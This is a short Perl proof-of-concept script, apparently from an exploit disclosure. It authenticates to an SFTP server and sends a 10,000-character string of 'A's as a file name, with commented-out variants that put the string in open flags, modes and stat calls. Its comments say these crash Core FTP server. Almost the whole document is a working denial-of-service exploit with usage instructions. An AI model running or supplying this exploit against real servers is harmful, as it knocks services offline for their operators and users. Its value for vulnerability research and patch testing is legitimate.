#!/usr/bin/perl
#leinakesi[at]gmail.com

use Net::SSH2;
use Getopt::Std;


$FUZZ = "A" x 10000;

getopts('S:P:u:p:', \%opts);
$server = $opts{'S'}; $port = $opts{'P'}; $user = $opts{'u'}; $pass = $opts{'p'};

if(!defined($server) || !defined($port) || !defined($user) || !defined($pass) )
{
        print "usage:\n\tperl   test.pl -S [IP] -P [port] -u [user] -p [password]\nexample:\n";
        print "\tperl   test.pl -S 192.168.48.114 -P 22 -u chloe -p 111111\n";
        exit(0);
}

$ssh2 = Net::SSH2->new();
$ssh2->connect($server, $port) || die "can not connect the server, please check.\n";
$ssh2->auth_password($user, $pass) || die "you sure user name and password are correct?\n";
$sftp = $ssh2->sftp();

#any command of the following would cause Core FTP server crash.
$o1 = $sftp->open($FUZZ);
#$o2 = $sftp->open("test", "O_RDWR", $FUZZ);
#$o3 = $sftp->open("test", $FUZZ, 0666);$o3 = $sftp->open("test", $FUZZ, 0666);
#$st = $sftp->stat($FUZZ);

$ssh2->disconnect();
